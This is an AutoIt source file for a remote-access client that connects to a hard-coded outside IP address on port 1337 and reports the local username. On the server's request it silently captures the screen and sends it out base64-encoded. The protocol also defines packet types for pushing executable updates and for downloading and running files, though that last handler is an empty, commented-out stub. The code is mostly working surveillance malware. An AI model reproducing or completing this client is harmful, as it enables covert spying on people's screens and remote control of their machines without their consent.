#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Outfile=Client.exe
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.8.1
 Author:         myName

 Script Function:
	Template AutoIt script.

#ce ----------------------------------------------------------------------------

#include <GUIConstantsEx.au3>
#include <EditConstants.au3>
#include <GuiEdit.au3>
#include <GDIPlus.au3>
#include <WindowsConstants.au3>
#include <ScreenCapture.au3>
#include <Base64.au3>

TCPStartup()
_GDIPlus_Startup()

Global Const $PacketSystem = "[PACKET_TYPE_0001]" ; System messages (Close, Restart, etc)
Global Const $PacketMessage = "[PACKET_TYPE_0002]" ; Direct raw messages
Global Const $PacketBroadcast = "[PACKET_TYPE_0003]" ; Broadcasted raw messages
Global Const $PacketRequest = "[PACKET_TYPE_0004]" ; Requests (ex: request screenshot, request idletime, request uptime, request sys info, etc.)
Global Const $PacketClientName = "[PACKET_TYPE_0005]" ; Username
Global Const $PacketLogin = "[PACKET_TYPE_0006]" ; Login
Global Const $PacketBinaryUpdate = "[PACKET_TYPE_0007]" ; Update (Base64 of exe binary)
Global Const $PacketURLUpdate = "[PACKET_TYPE_0008]" ; Update (URL)
Global Const $PacketJPG = "[PACKET_TYPE_0009]" ; Base64 of JPG binary (screenshot)
Global Const $PacketTest = "[PACKET_TYPE_0010]" ; Listview test. System info.
Global Const $PacketDownloadAndRunFile = "[PACKET_TYPE_0011]" ;
Global Const $PacketDivider = "[PACKET_SPLIT]" ; NOT USED YET
Global Const $PacketEND = "[PACKET_END]" ; Defines the end of a packet
Global $Buffer = ""
GLobal $PacketSize = 1000

$address = "68.200.5.232"

Global $ConnectedSocket = TCPConnect( $address, 1337)
If @error Then
	Sleep(5000)
	;Exit
EndIf

Global $ConnectedIP = _SocketToIP($ConnectedSocket)
TCPSend($ConnectedSocket, $PacketClientName & @UserName & $PacketEND)
TCPSend($ConnectedSocket, $PacketMessage & "Hello! We are now connected." & $PacketEND)

While 1
	_CheckNewPackets()
	Sleep( 1 )
WEnd

Func _CheckNewPackets()
		Local $RecvPacket
		$RecvPacket = TCPRecv($ConnectedSocket, $PacketSize) ; Attempt to receive data
		If $RecvPacket <> "" Then ; If we got data...
			$Buffer &= $RecvPacket ; Add it to the packet buffer.
		EndIf
		If StringInStr($Buffer, "[PACKET_TYPE_") And Not StringInStr($Buffer, $PacketEND) Then
			Local $LoopTimer = TimerInit()
			Do
				$RecvPacket = TCPRecv($ConnectedSocket, $PacketSize) ; Attempt to receive data
				If $RecvPacket <> "" Then ; If we got data...
					$Buffer &= $RecvPacket ; Add it to the packet buffer.
				EndIf
			Until $RecvPacket = "" Or TimerDiff($LoopTimer) >= 500
		EndIf
		If StringInStr($Buffer, $PacketEND) Then ; If we received the end of a packet, then we will process it.
			Local $RawPackets = $Buffer ; Transfer all the data we have to a new variable.
			Local $FirstPacketLength = StringInStr($RawPackets, $PacketEND) - 30 ; Get the length of the packet, and subtract the length of the prefix/suffix.
			Local $PacketType = StringLeft($RawPackets, 18) ; Copy the first 18 characters, since that is where the packet type is put.
			Local $CompletePacket = StringMid($RawPackets, 19, $FirstPacketLength + 11) ; Extract the packet.
			Local $PacketsLeftover = StringTrimLeft($RawPackets, $FirstPacketLength + 41) ; Trim what we are using, so we only have what is left over. (any incomplete packets)
			$Buffer = $PacketsLeftover ; Transfer any leftover packets back to the buffer.
			_ProcessFullPacket($CompletePacket, $PacketType)
		EndIf
EndFunc   ;==>_CheckNewPackets

Func _ProcessFullPacket($CompletePacket, $PacketType)
	Switch $PacketType
		Case $PacketRequest
			PacketRequest($CompletePacket)
		;Case $PacketDownloadAndRunFile
			;DownloadAndRunFile($CompletePacket)
	EndSwitch
EndFunc   ;==>_ProcessFullPacket

Func _Timestamp()
	Local $TimeStamp = "[" & @HOUR & ":" & @MIN & ":" & @SEC & "]"
	Return $TimeStamp
EndFunc

Func HBITMAP2BinaryString($HBITMAP) ;function by Andreik
	Local $BITMAP = _GDIPlus_BitmapCreateFromHBITMAP($HBITMAP)
	Local $JPG_ENCODER = _GDIPlus_EncodersGetCLSID("jpg")
	Local $TAG_ENCODER = _WinAPI_GUIDFromString($JPG_ENCODER)
	Local $PTR_ENCODER = DllStructGetPtr($TAG_ENCODER)
	Local $STREAM = DllCall("ole32.dll", "uint", "CreateStreamOnHGlobal", "ptr", 0, "bool", 1, "ptr*", 0)
	DllCall($__g_hGDIPDll, "uint", "GdipSaveImageToStream", "ptr", $BITMAP, "ptr", $STREAM[3], "ptr", $PTR_ENCODER, "ptr", 0)
	_GDIPlus_BitmapDispose($BITMAP)
	Local $MEMORY = DllCall("ole32.dll", "uint", "GetHGlobalFromStream", "ptr", $STREAM[3], "ptr*", 0)
	Local $MEM_SIZE = _MemGlobalSize($MEMORY[2])
	Local $MEM_PTR = _MemGlobalLock($MEMORY[2])
	Local $DATA_STRUCT = DllStructCreate("byte[" & $MEM_SIZE & "]", $MEM_PTR)
	Local $data = DllStructGetData($DATA_STRUCT, 1)
	Local $tVARIANT = DllStructCreate("word vt;word r1;word r2;word r3;ptr data;ptr")
	Local $aCall = DllCall("oleaut32.dll", "long", "DispCallFunc", "ptr", $STREAM[3], "dword", 8 + 8 * @AutoItX64, "dword", 4, "dword", 23, "dword", 0, "ptr", 0, "ptr", 0, "ptr", DllStructGetPtr($tVARIANT))
	_MemGlobalFree($MEMORY[2])
	Return $data
EndFunc   ;==>HBITMAP2BinaryString

Func _SocketToIP($SHOCKET) ; IP of the connecting client.
	Local $WS2_32 = DllOpen("Ws2_32.dll")
	Local $sockaddr = DllStructCreate("short;ushort;uint;char[8]")
	Local $aRet = DllCall($WS2_32, "int", "getpeername", "int", $SHOCKET, "ptr", DllStructGetPtr($sockaddr), "int*", DllStructGetSize($sockaddr))
	If Not @error And $aRet[0] = 0 Then
		$aRet = DllCall($WS2_32, "str", "inet_ntoa", "int", DllStructGetData($sockaddr, 3))
		If Not @error Then $aRet = $aRet[0]
	Else
		$aRet = 0
	EndIf
	$sockaddr = 0
	Return $aRet
EndFunc   ;==>_SocketToIP

Func SendScreenshot()
	Local $hImg = _ScreenCapture_Capture()
	Local $bImg = HBITMAP2BinaryString($hImg)
	Local $Base64JPG = $PacketJPG & _Base64Encode(Binary($bImg)) & $PacketEND
	Local $Length = StringLen($Base64JPG)
	TCPSend($ConnectedSocket, $Base64JPG)
	_GDIPlus_ImageDispose($bImg)
	_WinAPI_DeleteObject($hImg)
EndFunc

Func PacketRequest($Message)
	If $Message = "screenshot" Then
		SendScreenshot()
	EndIf



EndFunc

Func DownloadAndRunFile($Data)

EndFunc
